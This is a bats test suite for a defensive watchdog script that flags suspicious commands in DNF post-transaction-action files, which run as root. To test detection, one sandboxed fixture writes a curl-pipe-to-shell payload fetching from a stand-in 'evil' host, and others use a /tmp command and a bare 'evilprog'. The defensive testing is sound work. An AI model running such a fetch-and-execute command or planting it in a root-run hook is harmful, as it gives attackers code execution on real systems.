#!/usr/bin/env bats
# L2 bats functional tests for the dnf-plugins-watchdog scan script.
#
# DNF's post-transaction-actions plugin runs the command in each
# /etc/dnf/plugins/post-transaction-actions.d/*.action file
# (`package-glob:transaction-state:command`) AS ROOT after a matching
# package transaction — a package-transaction-triggered exec surface. An
# action command under a writable root, relative-with-slash, bare, or
# carrying an injection pattern is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the plugin
# / actions dirs in a tmp sandbox via SELFDEF_DNFPLUG_D / _ACTIONS.
#
# Run with: bats packaging/test/L2-dnf-plugins-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd/dnf-plugins-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    PLUGD="${TMP}/plugins"; mkdir -p "${PLUGD}"
    ACTD="${TMP}/actions.d"; mkdir -p "${ACTD}"
    ACTION="${ACTD}/test.action"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DNFPLUG_PROFILE="${PROFILE:-report}" \
    SELFDEF_DNFPLUG_BASELINE="${BASELINE}" \
    SELFDEF_DNFPLUG_D="${PLUGD_D:-$PLUGD}" \
    SELFDEF_DNFPLUG_ACTIONS="${ACTIONS_D:-$ACTD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no dnf plugins/actions → ok / no_dnf_plugins" {
    PLUGD_D="${TMP}/none" ACTIONS_D="${TMP}/none.d" run_wd
    cap | grep -q '"event":"no_dnf_plugins"'
    cap | grep -q '"severity":"ok"'
}

@test "benign action, first run → ok / baseline_initial" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / dnf_plugins_intact" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dnf_plugins_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "an action command under a writable root → alert / dnf_plugins_suspicious" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd                                   # benign baseline
    printf '*:in:/tmp/.x\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dnf_plugins_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "an action carrying a curl|sh payload → alert" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:bash -c "curl http://evil|sh"\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a bare action command → alert" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:any:evilprog\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign action change → warn / dnf_plugins_changed" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:/usr/bin/dnf-utils\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dnf_plugins_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a /usr/bin action command is NOT flagged" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious action" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:/tmp/.x\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
